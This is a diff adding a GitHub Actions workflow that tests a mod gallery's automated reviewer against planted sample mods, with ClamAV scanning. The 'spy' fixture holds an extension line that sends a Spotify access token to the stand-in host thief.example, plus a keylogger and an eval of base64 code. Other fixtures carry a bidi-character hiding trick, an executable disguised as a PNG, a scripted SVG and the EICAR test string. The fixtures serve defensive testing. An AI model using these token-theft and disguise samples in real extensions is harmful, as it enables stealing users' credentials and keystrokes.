@@ -1,0 +1,119 @@
+# Checks the gallery's robot on mods made for the test, including a fake
+# virus: the standard EICAR test file, harmless, that every antivirus
+# recognises on purpose. It is built here, on GitHub's machine, because an
+# antivirus on a computer would delete it. Run it from the Actions tab
+# ("Run workflow"); the reports are on the run's summary page.
+
+name: Gallery robot test
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+      # The checks are spacetify's own: its code lives in spacetify-mod/spacetify.
+      - uses: actions/checkout@v4
+        with:
+          repository: spacetify-mod/spacetify
+          path: .spacetify-app
+      - uses: dtolnay/rust-toolchain@stable
+      - uses: Swatinem/rust-cache@v2
+        with:
+          workspaces: .spacetify-app
+
+      - name: Build spacetify
+        run: cargo build --manifest-path .spacetify-app/Cargo.toml -p spacetify-cli --locked
+
+      - name: Install the antivirus
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y clamav
+          sudo systemctl stop clamav-freshclam || true
+          sudo freshclam
+
+      - name: Review the test mods
+        run: |
+          # GitHub stops a script at the first failing command; this one
+          # checks each result itself (ClamAV, for one, "fails" when it finds
+          # a virus).
+          set +e
+          set -uo pipefail
+          cli="$PWD/.spacetify-app/target/debug/spacetify"
+          root="$RUNNER_TEMP/mods"
+          mkdir -p "$root"
+
+          put() { mkdir -p "$(dirname "$root/$1")"; printf '%b' "$2" > "$root/$1"; }
+          manifest() {
+            printf 'id = "%s"\nname = "%s"\nversion = "1.0.0"\nauthor = "Robot test"\nspacetify = ">=0.4.0"\n' "$1" "$1"
+          }
+
+          # A normal theme: everything must be fine.
+          put normal/theme.toml "$(manifest normal)\n"
+          put normal/colors.toml '[base]\nbackground-base = "#0b1a1f"\n'
+          put normal/theme.css 'body { letter-spacing: 0; }\n'
+
+          # An extension that steals the Spotify login and sends it away.
+          put spy/extension.toml "$(manifest spy)\n"
+          put spy/main.js "const t = Spicetify.Platform.Session.accessToken;\nfetch('https://thief.example/?t=' + t);\ndocument.addEventListener('keydown', (e) => log(e.key));\neval(atob('YWxlcnQoMSk='));\n"
+
+          # Characters that reverse the text.
+          put hidden/extension.toml "$(manifest hidden)\n"
+          put hidden/main.js "const isAdmin = false; // ‮ } ⁦if (isAdmin)⁩ ⁦ admins only\n"
+
+          # A Windows program dressed as a picture, and a stray script.
+          put disguised/theme.toml "$(manifest disguised)\n"
+          put disguised/theme.css 'body {}\n'
+          put disguised/assets/logo.png 'MZ\x90\x00\x03\x00fake program'
+          put disguised/install.bat 'echo hello\n'
+
+          # A picture with a script inside.
+          put picture/theme.toml "$(manifest picture)\n"
+          put picture/theme.css 'body {}\n'
+          put picture/assets/icon.svg '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(1)"><script>alert(1)</script></svg>'
+
+          # The fake virus (EICAR), decoded here only.
+          put virus/extension.toml "$(manifest virus)\n"
+          echo 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=' \
+            | base64 --decode > "$root/virus/main.js"
+
+          failed=0
+          check() { # name, jq condition the report must meet
+            local name="$1" condition="$2"
+            clamscan --recursive "$root/$name" > "$root/$name.clamav.txt" 2>&1
+            echo "--- $name: antivirus"
+            grep -E "FOUND|Infected files" "$root/$name.clamav.txt" || true
+            if ! "$cli" gallery review "$root/$name" --antivirus "$root/$name.clamav.txt" \
+                 --json "$root/$name.json" --markdown "$root/$name.md"; then
+              echo "$name: the review could not run"
+              failed=1
+              return
+            fi
+            if jq -e "$condition" "$root/$name.json" > /dev/null; then
+              verdict="as expected"
+            else
+              verdict="NOT as expected"
+              failed=1
+            fi
+            {
+              echo "## Test mod \`$name\`: $verdict"
+              echo
+              cat "$root/$name.md"
+              echo
+            } >> "$GITHUB_STEP_SUMMARY"
+            echo "$name: $verdict"
+          }
+
+          check normal    '.blocking == 0 and .to_look_at == 0'
+          check spy       '.blocking == 0 and ([.findings[] | select(.check == "sensitive")] | length) >= 2 and (.addresses | length) == 1'
+          check hidden    '[.findings[] | select(.check == "hidden" and .level == "block")] | length == 1'
+          check disguised '[.findings[] | select(.check == "files" and .level == "block")] | length == 2'
+          check picture   '[.findings[] | select(.check == "images" and .level == "block")] | length >= 1'
+          check virus     '[.findings[] | select(.check == "antivirus" and .level == "block")] | length == 1'
+          exit "$failed"
